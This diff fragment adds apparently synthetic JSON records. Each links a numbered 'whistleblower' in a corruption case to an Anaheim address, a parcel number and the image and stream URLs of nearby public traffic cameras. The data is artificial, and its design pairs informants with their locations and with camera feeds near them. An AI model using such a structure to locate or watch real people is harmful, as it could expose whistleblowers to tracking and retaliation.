+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #94 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0647",
+      "entity_name": "WHISTLEBLOWER 095",
+      "address": "1095 EAST BALL ROAD SUITE 5, ANAHEIM, CA",
+      "apn": "178-431-95",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #95 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0648",
+      "entity_name": "WHISTLEBLOWER 096",
+      "address": "1096 EAST BALL ROAD SUITE 6, ANAHEIM, CA",
+      "apn": "178-431-96",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #96 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0649",
+      "entity_name": "WHISTLEBLOWER 097",
+      "address": "1097 EAST BALL ROAD SUITE 7, ANAHEIM, CA",
+      "apn": "178-431-97",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #97 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0650",
+      "entity_name": "WHISTLEBLOWER 098",
+      "address": "1098 EAST BALL ROAD SUITE 8, ANAHEIM, CA",
+      "apn": "178-431-98",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #98 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0651",
       "entity_name": "WHISTLEBLOWER 099",
       "address": "1099 EAST BALL ROAD SUITE 9, ANAHEIM, CA",
       "apn": "178-431-99",
